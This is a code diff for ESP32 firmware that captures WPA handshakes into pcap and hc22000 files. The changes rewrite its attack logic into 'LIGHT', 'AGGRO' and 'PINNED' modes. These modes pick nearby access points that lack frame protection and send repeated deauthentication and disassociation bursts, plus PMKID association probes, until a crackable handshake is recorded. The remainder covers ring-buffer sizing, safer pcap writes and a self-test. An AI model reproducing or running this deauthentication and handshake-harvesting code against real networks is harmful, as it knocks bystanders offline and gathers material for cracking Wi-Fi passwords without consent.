@@ -5,7 +5,7 @@
 #include "pcap.h"
 #include "hc22000.h"
 #include "capture_name.h"
-#include "methods/method_ctx.h"
+#include "beacon_slot.h"
 #include "../storage/littlefs_ops.h"
 #include "../net/ap_sta.h"
 #include "../core/config.h"
@@ -28,7 +28,15 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
 namespace Cap {
 
 static const uint16_t FRAME_MAX = 512;
-static const uint8_t  RING_SLOTS = 12;
+static const uint8_t  RING_SLOTS_MAX = 32;
+static uint8_t        s_ringCap = 12;   // live slots from RADIO PRO (8..32)
+static uint8_t        s_flushEvery = 8;
+static uint8_t        s_writeRetry = 1;
+static bool           s_magicCheck = true;
+static bool           s_sizeVerify = false;
+static bool           s_protectPcap = true;
+static bool           s_learnRename = true;
+static bool           s_migrateNames = true;
 static const uint32_t MAX_FILE_SIZE = 50UL * 1024UL * 1024UL; // 50 MB per pcap
 static const uint16_t MAX_FILES = 200;
 static const uint8_t HOP_ALL[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
@@ -44,7 +52,7 @@ struct Slot {
     uint8_t  frame[FRAME_MAX];
 };
 
-static Slot s_ring[RING_SLOTS];
+static Slot s_ring[RING_SLOTS_MAX];
 static volatile uint8_t s_write = 0;
 static volatile uint8_t s_read  = 0;
 
@@ -80,8 +88,8 @@ static bool     s_pendingLearn = false;
 static portMUX_TYPE s_pendingMux = portMUX_INITIALIZER_UNLOCKED;
 
 static const uint8_t BEACON_SLOTS = 16;
-// BeaconSlot itself now lives in methods/beacon_slot.h (pulled in via
-// method_ctx.h) so the capture methods can read it without depending on
+// BeaconSlot itself now lives in beacon_slot.h (pulled in via
+// beacon_slot.h) so the capture methods can read it without depending on
 // sniffer.cpp's internals.
 static BeaconSlot s_beacons[BEACON_SLOTS];
 static uint8_t s_beaconCount = 0;
@@ -156,6 +164,13 @@ static const uint8_t SKIP_MAX = 16;
 static uint8_t s_skipList[SKIP_MAX][6];
 static uint8_t s_skipN = 0;
 static bool    s_skipKeyWas = false;
+
+// Sniffer v2 focus (AGGRO): one AP until handshake or timeout, then next.
+static uint8_t  s_focusBssid[6] = {};
+static bool     s_focusOk = false;
+static uint32_t s_focusSince = 0;
+static uint8_t  s_focusCh = 0;
+
 
 // True MAC empty check — first-byte-only was wrong for BSSIDs like 00:11:22:…
 static bool isZeroMac(const uint8_t* m) {
@@ -266,25 +281,16 @@ static BeaconSlot* findBeacon(const uint8_t* bssid) {
     return nullptr;
 }
 
-// Method dispatch reads from Methods::table() (see methods/method_ctx.h).
-// Adding a capture method = adding a row to METHOD_LIST() in method_ctx.h;
-// the compiler rebuilds the table, this file doesn't need a thing.
-//
-// s_activeMethod is the index into that table; 0 is the default. The AUTO
-// mode rotates through [1..count) after a fallback timeout, see
-// maybeRotateMethod().
-
 static uint8_t s_methodCount = 0;
 
-static const Methods::Entry* methodTable() {
-    return Methods::table(&s_methodCount);
-}
 
 static void setMethodTag() {
-    const Methods::Entry* tbl = methodTable();
-    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
-    const char* n = tbl[idx].name;
-    strncpy(s_cnt.methodTag, n, sizeof(s_cnt.methodTag) - 1);
+    // Methods removed — show mode in tag for UI.
+    const char* tag = "CAP";
+    if (s_mode == RunMode::Light) tag = "LIGHT";
+    else if (s_mode == RunMode::Aggressive) tag = "AGGRO";
+    else if (s_mode == RunMode::Pinned) tag = "PIN";
+    strncpy(s_cnt.methodTag, tag, sizeof(s_cnt.methodTag) - 1);
     s_cnt.methodTag[sizeof(s_cnt.methodTag) - 1] = '\0';
 }
 
@@ -573,7 +579,7 @@ static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t typ
         armLockOnBssid(bssid, s_cnt.currentChannel);
     }
 
-    uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
+    uint8_t next = (uint8_t)((s_write + 1) % s_ringCap);
     if (next == s_read) {
         s_cnt.framesDropped++;
         return;
@@ -610,6 +616,7 @@ static void makeFilename(const uint8_t* bssid, char out[Storage::FILE_NAME_MAX])
 // Fold pure-MAC / HIDDEN_* leftovers into the preferred path (SSID when known).
 // Never overwrites an existing preferred file that already has data.
 static void migrateLegacyPcapName(const uint8_t* bssid, const char* preferredPath) {
+    if (!s_migrateNames) return;
     if (!bssid || !preferredPath) return;
     if (SD.exists(preferredPath)) {
         File p = SD.open(preferredPath, "r");
@@ -667,6 +674,7 @@ static void migrateLegacyPcapName(const uint8_t* bssid, const char* preferredPat
     }
 }
 
+static void closeFile();  // defined below; short-write path needs it
 static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts, uint8_t ch, int8_t rssi) {
     if (!s_file) return false;
     uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
@@ -677,19 +685,47 @@ static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts, ui
     ph.inclLen = rtLen + flen;
     ph.origLen = ph.inclLen;
     size_t expect = sizeof(ph) + rtLen + flen;
-    // Write as one shot where possible — partial write = corrupt packet boundary
+
+    // Build one buffer and write once (retry on short write = PRO W RETRY).
+    // Stack buffer: FRAME_MAX + headers stays under ~600 bytes.
+    uint8_t buf[sizeof(Pcap::PacketHeader) + Pcap::RADIOTAP_FAT_LEN + FRAME_MAX];
+    if (expect > sizeof(buf)) return false;
+    memcpy(buf, &ph, sizeof(ph));
+    memcpy(buf + sizeof(ph), rt, rtLen);
+    memcpy(buf + sizeof(ph) + rtLen, frame, flen);
+
     size_t n = 0;
-    n += s_file.write((uint8_t*)&ph, sizeof(ph));
-    n += s_file.write(rt, rtLen);
-    n += s_file.write(frame, flen);
-    if (n != expect) return false;
+    uint8_t tries = (uint8_t)(1 + s_writeRetry);
+    for (uint8_t ttry = 0; ttry < tries; ttry++) {
+        n = s_file.write(buf, expect);
+        if (n == expect) break;
+    }
+    if (n != expect) {
+        // Partial packet would corrupt the stream — close so next open is clean.
+        if (Config::radio().logSd)
+            Serial.printf("[CAP] short write n=%u expect=%u\n", (unsigned)n, (unsigned)expect);
+        closeFile();
+        return false;
+    }
     s_fileSize += expect;
-    // Flush every ~8 packets so a crash/power-loss does not leave a huge
-    // unflushed tail, and a second accidental open sees the real size.
+
     static uint8_t s_pktSinceFlush = 0;
-    if (++s_pktSinceFlush >= 8) {
+    if (++s_pktSinceFlush >= s_flushEvery) {
         s_pktSinceFlush = 0;
         s_file.flush();
+    }
+
+    // PRO SIZE VER: confirm SD size tracks our counter (slow — off by default).
+    if (s_sizeVerify) {
+        size_t onDisk = s_file.size();
+        if (onDisk < s_fileSize) {
+            s_file.flush();
+            onDisk = s_file.size();
+            if (onDisk < s_fileSize) {
+                closeFile();
+                return false;
+            }
+        }
     }
     return true;
 }
@@ -705,8 +741,10 @@ static void closeFile() {
     s_fileOpen = false;
 }
 
+// NEVER open pcap with "w"/"w+" — that zeroes a good file ("write write hop → 0").
 static bool openFileForBssid(const uint8_t* bssid) {
-    // Close any live handle (flag can be wrong after a bad merge).\n    closeFile();
+    // Close any live handle (flag can be wrong after a bad merge).
+    closeFile();
 
     Storage::Stats st = Storage::stats();
     char name[Storage::FILE_NAME_MAX];
@@ -743,7 +781,7 @@ static bool openFileForBssid(const uint8_t* bssid) {
                 chk.close();
                 bool okMagic = (magic == 0xA1B2C3D4u || magic == 0xD4C3B2A1u ||
                                 magic == 0xA1B23C4Du || magic == 0x4D3CB2A1u);
-                if (!okMagic) {
+                if (s_magicCheck && !okMagic) {
                     char bad[96];
                     snprintf(bad, sizeof(bad), "%s.bad", path);
                     SD.remove(bad);
@@ -919,6 +957,7 @@ static void processPendingSsidLearn() {
     s_pendingLearn = false;
     memcpy(bssid, s_pendingLearnBssid, 6);
     portEXIT_CRITICAL(&s_pendingMux);
+    if (!s_learnRename) return;
     const BeaconSlot* b = findBeacon(bssid);
     if (!b || !b->ssid[0]) return;
 
@@ -980,7 +1019,7 @@ static void drainRing() {
     while (s_read != s_write) {
         const Slot& s = s_ring[s_read];
         writeFrameToFile(s);
-        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
+        s_read = (uint8_t)((s_read + 1) % s_ringCap);
     }
     if (s_fileOpen) s_file.flush();
 }
@@ -1040,111 +1079,161 @@ static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) 
     if (e == ESP_OK) s_cnt.framesDeauth++;
 }
 
-static Methods::Ctx buildMethodCtx() {
-    Methods::Ctx ctx{};
-    ctx.beacons      = s_beacons;
-    ctx.beaconCount   = s_beaconCount;
-    ctx.channel       = s_cnt.currentChannel;
-    ctx.minRssi       = s_minRssi;
-    ctx.kickBurst     = s_kickBurst;
-    ctx.deauthReason  = s_deauthReason;
-    ctx.bidirKick     = s_bidirKick;
-    ctx.eapolTx       = s_eapolTx;
-    ctx.pmkidProbe    = s_pmkidProbe;
-    ctx.csaHerd       = s_csaHerd;
-    ctx.authFlood     = s_authFlood;
-    ctx.kickBssid     = s_kickBssid;
-    ctx.kickSta       = s_kickSta;
-    ctx.kickStaOk     = s_kickStaOk;
-    ctx.bcast         = s_bcast;
-    ctx.isOwnAp       = isOwnAp;
-    ctx.skipPin       = skipPin;
-    ctx.isSkipped     = isSessionSkipped;
-    ctx.sendRawMgmt   = sendRawMgmt;
-    ctx.framesDeauth  = &s_cnt.framesDeauth;
-    // Porkchop-style knobs - methods that don't read these just ignore
-    // them, no behavior change. PORKCHOP method picks them up.
-    ctx.jitterMs      = s_jitterMs;
-    ctx.cooldownSec   = s_cooldownSec;
-    ctx.scoreThr      = s_scoreThr;
-    ctx.dwellMinMs    = s_dwellMinMs;
-    ctx.hsDepth       = s_hsDepth;
-    // Lock-on-BSSID focus: pass the parked target to scoring methods so
-    // they don't drift to a higher-scoring neighbor while we wait for
-    // M2/M3/M4. Methods that don't read lockedBssid* (OURS, PAN, CSA,
-    // PMKID) are unaffected.
-    if (bssidLocked() && !isZeroMac(s_lockBssid)) {
-        memcpy(ctx.lockedBssid, s_lockBssid, 6);
-        ctx.lockedBssidActive = true;
-    } else {
-        ctx.lockedBssidActive = false;
+
+
+// ---------------------------------------------------------------------------
+// Sniffer v2 kick — NO method tables. Only RadioConfig knobs.
+//
+// LIGHT  (RunMode::Light): soft — few rounds, all APs on this channel that
+//         pass RSSI / skip / not-done filters. Hop does the "a little here,
+//         a little there".
+// AGGRO / PINNED: one focus BSSID. Stay and hammer until hasHandshake(depth)
+//         or focus timeout (fallbackSec), then clear focus and hop on.
+// ---------------------------------------------------------------------------
+
+static bool apDone(const uint8_t* bssid) {
+    return Hc22000::hasHandshake(bssid, s_hsDepth);
+}
+
+static bool apKickable(const BeaconSlot& b) {
+    if (isOwnAp(b.bssid)) return false;
+    if (skipPin(b.bssid)) return false;
+    if (isSessionSkipped(b.bssid)) return false;
+    if (b.rssi < s_minRssi) return false;
+    if (apDone(b.bssid)) return false;
+    if (b.pmfCapable) return false;
+    return true;
+}
+
+static void kickOneAp(const uint8_t* bssid, const uint8_t* staOrNull) {
+    uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
+    if (rounds > 6) rounds = 6;
+    const uint8_t* dest = (staOrNull && (staOrNull[0] & 1) == 0) ? staOrNull : s_bcast;
+    for (uint8_t r = 0; r < rounds; r++) {
+        sendRawMgmt(0xC0, bssid, dest); // deauth
+        sendRawMgmt(0xA0, bssid, dest); // disassoc
+        if (s_bidirKick && dest != s_bcast) {
+            sendRawMgmt(0xC0, dest, bssid);
+            sendRawMgmt(0xA0, dest, bssid);
+        }
+        if (s_jitterMs) delay(1 + (esp_random() % (s_jitterMs + 1)));
     }
-    ctx.dataAct       = s_dataAct;
-    ctx.strictLock    = s_strictLock;
-    ctx.depthHoldSec  = s_depthHoldSec;
-    return ctx;
+    if (s_pmkidProbe) {
+        char ssid[33];
+        ssidForBssid(bssid, ssid);
+        if (ssid[0] && !Hc22000::hasPair(bssid)) {
+            WSLBypasser::sendAuthentication(bssid);
+            WSLBypasser::sendAssociationRequest(bssid, ssid);
+        }
+    }
+}
+
+static void clearFocus() {
+    s_focusOk = false;
+    memset(s_focusBssid, 0, 6);
+    s_focusSince = 0;
+    s_focusCh = 0;
+}
+
+// Pick strongest kickable beacon on this channel (or any if ch==0).
+static bool pickFocusOnChannel(uint8_t ch) {
+    int best = -1;
+    int8_t bestRssi = -127;
+    for (uint8_t i = 0; i < s_beaconCount; i++) {
+        const BeaconSlot& b = s_beacons[i];
+        if (ch && b.channel && b.channel != ch) continue;
+        if (!apKickable(b)) continue;
+        if (b.rssi > bestRssi) {
+            bestRssi = b.rssi;
+            best = (int)i;
+        }
+    }
+    if (best < 0) return false;
+    memcpy(s_focusBssid, s_beacons[best].bssid, 6);
+    s_focusOk = true;
+    s_focusSince = millis();
+    s_focusCh = s_beacons[best].channel ? s_beacons[best].channel : s_cnt.currentChannel;
+    setBarTarget(1, s_focusBssid, s_beacons[best].ssid);
+    armLockOnBssid(s_focusBssid, s_focusCh);
+    return true;
+}
+
+static uint32_t focusTimeoutMs() {
+    // How long AGGRO stays on one AP before giving up and moving on.
+    uint32_t t = (uint32_t)s_fallbackSec * 1000u;
+    if (t < 8000) t = 8000;
+    if (t > 120000) t = 120000;
+    // Also respect lockMs as a floor of patience after first EAPOL.
+    if (s_lockMs > t) t = s_lockMs;
+    return t;
 }
 
 static void kickOnThisChannel() {
     if (!s_deauthEnabled) return;
     if (Hc22000::shouldPauseDeauth()) return;
-    const Methods::Entry* tbl = methodTable();
-    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
-    const Methods::Entry& m = tbl[idx];
-    if (s_pinOk) {
-        bool seen = false;
-        for (uint8_t i = 0; i < s_beaconCount; i++) {
-            if (memcmp(s_beacons[i].bssid, s_pinBssid, 6) == 0) { seen = true; break; }
-        }
-        if (!seen) {
-            // Pinned target hasn't shown up in any beacon yet. In
-            // STEALTH-like packs (bidirKick=false, authFlood=false) we
-            // MUST NOT broadcast deauth into the void - that would
-            // blow the user's stealth even though we don't even know
-            // the target is on this channel. Same rule as the global
-            // guard in method_porkchop.cpp: "no deauth at all" means
-            // "no deauth at all", even from the sniffer's pinned-fallback
-            // path. PMKID-probe below is fine to keep going (it's not
-            // a deauth), gated on s_pmkidProbe + known SSID.
-            bool pinnedStealth = !s_bidirKick && !s_authFlood;
-            if (!pinnedStealth) {
-                uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
-                for (uint8_t r = 0; r < rounds; r++) {
-                    sendRawMgmt(0xC0, s_pinBssid, s_bcast);
-                    sendRawMgmt(0xA0, s_pinBssid, s_bcast);
-                }
-            }
-            if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
-                !Hc22000::hasPair(s_pinBssid)) {
-                WSLBypasser::sendAuthentication(s_pinBssid);
-                WSLBypasser::sendAssociationRequest(s_pinBssid, s_pinSsid);
-            }
-        }
-    }
-    Methods::Ctx ctx = buildMethodCtx();
-    if (m.kick) m.kick(ctx);
-    if (m.probe) m.probe(ctx);
-}
 
-static void maybeRotateMethod() {
-    if (s_hsMethod != (uint8_t)HsMethod::AUTO) return;
-    if (s_methodCount < 2) return; // nothing to rotate through
-    uint16_t pairs = Hc22000::pairCount();
-    if (pairs > s_pairAtSwitch) {
-        s_pairAtSwitch = pairs;
-        s_methodStartMs = millis();
+    // PINNED: always the pin target only.
+    if (s_pinOk) {
+        if (isSessionSkipped(s_pinBssid)) return;
+        if (apDone(s_pinBssid)) return;
+        const uint8_t* sta = nullptr;
+        if (s_kickStaOk && memcmp(s_kickBssid, s_pinBssid, 6) == 0)
+            sta = s_kickSta;
+        kickOneAp(s_pinBssid, sta);
+        setBarTarget(3, s_pinBssid, s_pinSsid);
         return;
     }
-    uint32_t waitMs = (uint32_t)s_fallbackSec * 1000u;
-    if (waitMs < 10000) waitMs = 10000;
-    if (millis() - s_methodStartMs < waitMs) return;
-    // Round-robin through every method in the table. The first entry is
-    // the AUTO default; every other entry gets a turn after fallbackSec.
-    s_activeMethod = (uint8_t)((s_activeMethod + 1) % s_methodCount);
-    s_methodStartMs = millis();
-    s_pairAtSwitch = pairs;
-    setMethodTag();
-    Serial.printf("[CAP] AUTO switch -> %s\n", s_cnt.methodTag);
+
+    // AGGRO: one focus AP until done or timeout.
+    if (s_mode == RunMode::Aggressive) {
+        if (s_focusOk) {
+            if (apDone(s_focusBssid) || isSessionSkipped(s_focusBssid)) {
+                clearFocus();
+                disarmLockOnBssid();
+            } else if ((millis() - s_focusSince) >= focusTimeoutMs()) {
+                // Could not finish — NEXT AP (no session skip). May revisit later.
+                clearFocus();
+                disarmLockOnBssid();
+            }
+        }
+        if (!s_focusOk) {
+            if (!pickFocusOnChannel(s_cnt.currentChannel))
+                pickFocusOnChannel(0); // any channel beacons we know
+        }
+        if (!s_focusOk) return;
+
+        // Stay on focus channel.
+        if (s_focusCh >= 1 && s_focusCh <= 13 &&
+            s_cnt.currentChannel != s_focusCh) {
+            esp_wifi_set_channel(s_focusCh, WIFI_SECOND_CHAN_NONE);
+            s_cnt.currentChannel = s_focusCh;
+        }
+        const uint8_t* sta = nullptr;
+        if (s_kickStaOk && memcmp(s_kickBssid, s_focusBssid, 6) == 0)
+            sta = s_kickSta;
+        kickOneAp(s_focusBssid, sta);
+        setBarTarget(4, s_focusBssid, nullptr);
+        return;
+    }
+
+    // LIGHT: sprinkle — kick up to 2 kickable APs on this channel, one burst each.
+    uint8_t nKick = 0;
+    for (uint8_t i = 0; i < s_beaconCount && nKick < 2; i++) {
+        const BeaconSlot& b = s_beacons[i];
+        if (b.channel && b.channel != s_cnt.currentChannel) continue;
+        if (!apKickable(b)) continue;
+        const uint8_t* sta = nullptr;
+        if (s_kickStaOk && memcmp(s_kickBssid, b.bssid, 6) == 0)
+            sta = s_kickSta;
+        kickOneAp(b.bssid, sta);
+        nKick++;
+        yield();
+    }
+}
+
+// Methods removed from live path — pack presets only set knobs.
+static void maybeRotateMethod() {
+    // no-op (kept so call sites compile without a wide edit)
 }
 
 void begin() {
@@ -1162,6 +1251,7 @@ void begin() {
 }
 
 static void startCommon(RunMode mode) {
+    clearFocus();
     bool sdOk = Storage::begin();
     if (!sdOk) Serial.println("[CAP] SD missing - EAPOL counted, files may fail");
 
@@ -1204,7 +1294,6 @@ static void startCommon(RunMode mode) {
     s_hopMs = Config::radio().hopMs;
     s_minRssi = Config::radio().minRssi;
     s_hopSet = Config::radio().hopSet;
-    s_hsMethod = Config::radio().hsMethod;
     s_fallbackSec = Config::radio().fallbackSec;
     s_kickBurst = Config::radio().kickBurst;
     s_bidirKick = Config::radio().bidirKick;
@@ -1226,23 +1315,27 @@ static void startCommon(RunMode mode) {
     s_strictLock = Config::radio().strictLock;
     s_depthHoldSec = Config::radio().depthHoldSec;
     if (s_depthHoldSec > 30) s_depthHoldSec = 30;
-    // AUTO starts on table index 0 and rotates via maybeRotateMethod().
-    if (s_methodCount == 0) methodTable(); // populate s_methodCount
-    // s_hsMethod on-disk layout: 0 = AUTO, 1..N = Methods::name(idx-1).
-    // This must match hsMethodName()/hsMethodIndex() (settings_menu.cpp,
-    // config.cpp) exactly, or the method the user picked in the Radio menu
-    // (which can be ANY registered method, not just OURS/PAN) silently
-    // resolves to table index 0 instead - that's what caused the bottom
-    // bar's P:/M: tags to disagree with what was actually running.
-    if (s_hsMethod == (uint8_t)HsMethod::AUTO || s_methodCount == 0) {
-        s_activeMethod = 0;
-    } else {
-        uint8_t idx = (uint8_t)(s_hsMethod - 1);
-        s_activeMethod = (idx < s_methodCount) ? idx : 0;
+    {
+        uint8_t rs = Config::radio().ringSlots;
+        if (rs < 8) rs = 8;
+        if (rs > RING_SLOTS_MAX) rs = RING_SLOTS_MAX;
+        s_ringCap = rs;
+        s_flushEvery = Config::radio().flushEvery;
+        if (s_flushEvery < 1) s_flushEvery = 1;
+        if (s_flushEvery > 32) s_flushEvery = 32;
+        s_writeRetry = Config::radio().writeRetry;
+        if (s_writeRetry > 3) s_writeRetry = 3;
+        s_magicCheck = Config::radio().magicCheck;
+        s_sizeVerify = Config::radio().sizeVerify;
+        s_protectPcap = Config::radio().protectPcap;
+        s_learnRename = Config::radio().learnRename;
+        s_migrateNames = Config::radio().migrateNames;
+        s_write = 0;
+        s_read = 0;
     }
+
     s_methodStartMs = millis();
     s_pairAtSwitch = Hc22000::pairCount();
-    Methods::resetAll();
     setMethodTag();
     if (s_hopMs < 50) s_hopMs = 50;
 
@@ -1313,6 +1406,7 @@ void startPinned(uint8_t ch, const uint8_t* bssid, const char* ssid) {
 }
 
 void stop() {
+    clearFocus();
     if (!s_running && s_mode == RunMode::Off) return;
     bool hopped = s_hopEnabled;
     s_running = false;
@@ -1518,6 +1612,15 @@ void loop() {
         s_cnt.currentChannel = s_lockBssidCh;
     }
 
+    // AGGRO focus: stay on one AP (no hop) until HS or focus timeout.
+    if (s_mode == RunMode::Aggressive && s_focusOk && !apDone(s_focusBssid)) {
+        if (now - s_lastHopMs >= 400) {
+            s_lastHopMs = now;
+            kickOnThisChannel();
+        }
+        return;
+    }
+
     if (isLocked()) {
         if (now - s_lastHopMs >= 400) {
             s_lastHopMs = now;
@@ -1545,5 +1648,64 @@ void loop() {
         kickOnThisChannel();
     }
 }
+
+
+void flushNow() {
+    if (s_file) {
+        s_file.flush();
+        if (Config::radio().logSd)
+            Serial.printf("[CAP] flushNow size=%u\n", (unsigned)s_fileSize);
+    }
+}
+
+bool selfTestPcap() {
+    Storage::ensureDir(Storage::DIR_HS);
+    char path[64];
+    snprintf(path, sizeof(path), "%s_SELFTEST.pcap", PREFIX);
+    // Always recreate test file
+    SD.remove(path);
+    File f = SD.open(path, "w");
+    if (!f) {
+        Serial.println("[CAP] selfTest open fail");
+        return false;
+    }
+    Cap::Pcap::FileHeader fh;
+    fh.magic = 0xA1B2C3D4;
+    fh.versionMajor = 2;
+    fh.versionMinor = 4;
+    fh.thiszone = 0;
+    fh.sigfigs = 0;
+    fh.snaplen = 65535;
+    fh.linktype = 127;
+    f.write((uint8_t*)&fh, sizeof(fh));
+
+    // Minimal radiotap + fake beacon-ish mgmt frame (type beacon subtype)
+    uint8_t rt[16];
+    uint8_t rtLen = Cap::Pcap::buildRadiotap(rt, 6, -50, true);
+    uint8_t frame[32];
+    memset(frame, 0, sizeof(frame));
+    frame[0] = 0x80; // beacon
+    frame[1] = 0x00;
+    // addr1 broadcast
+    memset(frame + 4, 0xFF, 6);
+    // addr2/3 = 02:00:00:00:00:01
+    frame[10] = 0x02;
+    frame[16] = 0x02;
+
+    Cap::Pcap::PacketHeader ph;
+    ph.tsSec = millis() / 1000;
+    ph.tsUsec = (millis() % 1000) * 1000;
+    ph.inclLen = rtLen + sizeof(frame);
+    ph.origLen = ph.inclLen;
+    f.write((uint8_t*)&ph, sizeof(ph));
+    f.write(rt, rtLen);
+    f.write(frame, sizeof(frame));
+    f.flush();
+    size_t sz = f.size();
+    f.close();
+    Serial.printf("[CAP] selfTest wrote %s (%u bytes)\n", path, (unsigned)sz);
+    return sz >= sizeof(fh) + sizeof(ph) + 8;
+}
+
 
 } // namespace Cap
